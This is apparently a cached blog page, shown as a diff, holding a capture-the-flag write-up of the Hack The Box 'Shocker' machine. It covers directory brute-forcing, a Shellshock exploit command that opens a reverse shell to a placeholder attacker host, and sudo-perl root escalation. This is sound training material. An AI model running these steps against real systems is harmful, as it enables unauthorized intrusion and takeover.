@@ -1,0 +1,128 @@
+I"�<h1 id="introductionlame">Introduction@Lame:~$</h1>
+
+<table>
+  <thead>
+    <tr>
+      <th>Column</th>
+      <th>Details</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Name</td>
+      <td>Shocker</td>
+    </tr>
+    <tr>
+      <td>IP</td>
+      <td>10.10.10.56</td>
+    </tr>
+    <tr>
+      <td>Points</td>
+      <td>20</td>
+    </tr>
+    <tr>
+      <td>Os</td>
+      <td>Linux</td>
+    </tr>
+    <tr>
+      <td>Difficult</td>
+      <td>Easy</td>
+    </tr>
+    <tr>
+      <td>Creator</td>
+      <td><a href="https://www.hackthebox.eu/profile/2984">mrb3n</a></td>
+    </tr>
+    <tr>
+      <td>Out on</td>
+      <td>30th September 2017</td>
+    </tr>
+  </tbody>
+</table>
+
+<h1 id="summary">Summary:~$</h1>
+
+<ul>
+  <li>Discovering the new host and scanning for open ports.</li>
+  <li>Using <code class="language-plaintext highlighter-rouge">gobuster</code> on port 80, for <code class="language-plaintext highlighter-rouge">directory search</code>, we got <code class="language-plaintext highlighter-rouge">/cgi-bin/</code> as one of the <em>Forbidden</em> directories.</li>
+  <li>Using <code class="language-plaintext highlighter-rouge">gobuster</code> on <code class="language-plaintext highlighter-rouge">/cgi-bin/</code>, we got <code class="language-plaintext highlighter-rouge">user.sh</code></li>
+  <li>After searching on internet, we got <code class="language-plaintext highlighter-rouge">shellshock</code> exploit, which gave us <code class="language-plaintext highlighter-rouge">User Shell</code>.</li>
+  <li>Used <code class="language-plaintext highlighter-rouge">pearl</code> for escalating privileges to become <code class="language-plaintext highlighter-rouge">Root</code>.</li>
+</ul>
+
+<h1 id="starting">Starting:~$</h1>
+
+<h2 id="nmap">Nmap</h2>
+
+<p>I have used <strong>nmapAutomator</strong> , which keeps the scanning fast and reduces effort.<em>(Not recommended in real life scenarios).</em></p>
+
+<p>Dowload link: <a href="https://github.com/21y4d/nmapAutomator">nmapAutomator</a></p>
+
+<hr />
+<p><img src="/assets/img/shocker-hackthebox/nmap-port-80-1.png" alt="" /></p>
+
+<hr />
+<p><img src="/assets/img/shocker-hackthebox/nmap-port-2222-1.png" alt="" /></p>
+
+<p>Basically <code class="language-plaintext highlighter-rouge">2 Ports</code> are open i.e. <code class="language-plaintext highlighter-rouge">80,2222</code>, Let’s access <code class="language-plaintext highlighter-rouge">port 80</code> it first.</p>
+
+<hr />
+<p><img src="/assets/img/shocker-hackthebox/port-80-2.png" alt="" /></p>
+
+<p>Using <code class="language-plaintext highlighter-rouge">gobuster</code> for directory search, which gave us with <code class="language-plaintext highlighter-rouge">/cgi-bin/</code> as a directory but it’s <em>Forbidden</em>.</p>
+
+<p><strong>Command</strong>: <em>gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.56/ -t 100</em></p>
+
+<hr />
+<p><img src="/assets/img/shocker-hackthebox/gobuster-command-3.png" alt="" /></p>
+
+<p>Using <code class="language-plaintext highlighter-rouge">gobuster</code> on <strong>http://10.10.10.56/cgi-bin/</strong> to search for further files.</p>
+
+<p><strong>Command</strong>: <em>gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -t 100 -x html,php,sh</em></p>
+
+<p>where <strong>-x</strong> : <em>For extensions like html,php,sh etc.</em></p>
+
+<hr />
+<p><img src="/assets/img/shocker-hackthebox/cgi-bin-gobuster-7.png" alt="" /></p>
+
+<p>and we got <code class="language-plaintext highlighter-rouge">/user.sh</code> as a file , accessing <strong>http://10.10.10.56/cgi-bin/user.sh</strong></p>
+
+<hr />
+<p><img src="/assets/img/shocker-hackthebox/user-sh-page-8.png" alt="" /></p>
+
+<p>After that I googled about <code class="language-plaintext highlighter-rouge">Apache 2.4.18 cgi bin</code>, which showed me something related to <strong>Shellshock Remote code injection</strong>.</p>
+
+<hr />
+<p><img src="/assets/img/shocker-hackthebox/google-cgi-bin-5.png" alt="" /></p>
+
+<p>I check <code class="language-plaintext highlighter-rouge">searchsploit</code> for that and found this:</p>
+
+<hr />
+<p><img src="/assets/img/shocker-hackthebox/searchsploit-result-6.png" alt="" /></p>
+
+<p>Now making some changes in the python exploit by adding <code class="language-plaintext highlighter-rouge">/cgi-bin/user.sh</code> as one the directories/pages.</p>
+
+<hr />
+<p><img src="/assets/img/shocker-hackthebox/changing-exploit-9.png" alt="" /></p>
+
+<p>Running the exploit gave us the <code class="language-plaintext highlighter-rouge">User Shell</code>.</p>
+
+<p><strong>Exploit Command</strong>: <em>python exploit.py payload=reverse rhost=10.10.10.56 lhost=10.10.X.X lport 4444</em></p>
+
+<hr />
+<p><img src="/assets/img/shocker-hackthebox/got-shell-10.png" alt="" /></p>
+
+<p>For <code class="language-plaintext highlighter-rouge">Privilege Escalation</code>, I used the command <code class="language-plaintext highlighter-rouge">sudo -l</code> to check what permissions do we have.</p>
+
+<hr />
+<p><img src="/assets/img/shocker-hackthebox/sudo-l-privesc-12.png" alt="" /></p>
+
+<p>We can run <code class="language-plaintext highlighter-rouge">pearl</code> as administrator. Let’s refer to <a href="https://gtfobins.github.io/gtfobins/perl/#sudo">GTFObins</a> and search for peal.</p>
+
+<hr />
+<p><img src="/assets/img/shocker-hackthebox/sudo-perl-13.png" alt="" /></p>
+
+<p>Running the above mentioned command, we got <code class="language-plaintext highlighter-rouge">Root</code>.</p>
+
+<hr />
+<p><img src="/assets/img/shocker-hackthebox/got-root-14.png" alt="" /></p>
+:ET
